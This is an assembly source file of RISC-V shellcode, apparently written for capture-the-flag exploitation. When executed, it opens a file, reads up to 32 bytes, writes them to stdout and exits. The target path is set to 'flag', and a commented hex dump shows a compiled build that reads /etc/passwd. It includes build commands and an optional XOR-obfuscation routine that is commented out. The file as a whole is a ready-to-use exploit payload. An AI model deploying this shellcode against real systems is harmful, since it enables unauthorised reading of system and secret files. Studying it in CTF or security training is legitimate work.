# thanks to https://gist.githubusercontent.com/Jinmo/79e599fafb63583928cc/raw/cd298fae94fb50a6a1b3d778214ada73ab2c429c/riscv-readfile.s

# file read shellcode
# riscv
# - buffer: pc + 0x100, must be writable
# - if you want, you can change it

# compile:
# export PATH=$PATH:/opt/riscv/bin
# riscv64-unknown-elf-as code.s -o code.o
# riscv64-unknown-elf-objcopy --dump-section .text=code.dump code.o
# output: code.dump
# input : code.s
# xxd result (byte order is big endian. 9304 0000 = 93 04 00 00)
# 0000000: 9304 0000 1300 0000 1300 0000 1705 0000  ................
# 0000010: 1305 c508 9305 0000 9306 0000 9308 0040  ...............@
# 0000020: 7300 0000 9306 0000 9308 f003 9705 0000  s...............
# 0000030: 9385 0510 1306 0002 7300 0000 9304 0002  ........s.......
# 0000040: 1384 0500 6f00 8002 1306 0500 1305 1000  ....o...........
# 0000050: 9308 0004 7300 0000 9305 0000 1306 0000  ....s...........
# 0000060: 9306 0000 9308 d005 7300 0000 1709 0000  ........s.......
# 0000070: 0329 4902 8329 0400 b3c9 2901 2320 3401  .)I..)....).# 4.
# 0000080: 1304 4400 9384 c4ff e380 04fc 6ff0 9ffe  ..D.........o...
# 0000090: 0000 0000 0000 0000 2f65 7463 2f70 6173  ......../etc/pas
# 00000a0: 7377 6400                                swd.
# 164 bytes

.set FILE_MAX_LENGTH, 32
.set XOR_KEY, 0x0
.macro FILE_PATH
	.asciz "flag"
.endm

.macro WHERE_TO_READ
	auipc	a1, 0 # a1 = pc
	addi	a1, a1, 0x100
.endm

_start:
	li s1, 0
	nop
	nop

	# fd<a0> = open(str, 0)
	auipc a0, 0; addi a0, a0, 0x54
	li		a1, 0
	li		a3, 0
	li		a7, 1024
	ecall

	
	# read(fd, pc + 0x100, FILE_MAX_LENGTH)
	li		a3, 0
	li		a7, 63
	WHERE_TO_READ # see above
	li		a2, FILE_MAX_LENGTH
	ecall

#	# xor_this(buffer<s0>, length<s1>)
#	li		s1, FILE_MAX_LENGTH
#	mv		s0, a1
#	j		xor_this
#	# jumps to xor_this -> loop -> jumps to xor_return, no link register
#
#xor_return:
	# write(1, buffer<a1>, a2)
	mv		a2, a0
	li		a0, 1
	li		a7, 64
	ecall

	# exit(write_length<a0>)
	# you can change a0 to change exit code
	li		a1, 0
	li		a2, 0
	li		a3, 0
	li		a7, 93
	ecall

# xor_this(buffer<s0>, length<s1>): xor buffer with xor_key, in length (must be 4byte)
#xor_this:
#	auipc s2, 0; lw s2,36(s2)
#	loop:
#		lw		s3, 0(s0)
#		xor		s3, s3, s2
#		sw		s3, 0(s0)
#		addi	s0, s0, 4
#		addi	s1, s1, -4
#		beqz	s1, xor_return
#		j		loop
#
#xor_key: .dword XOR_KEY

str: FILE_PATH
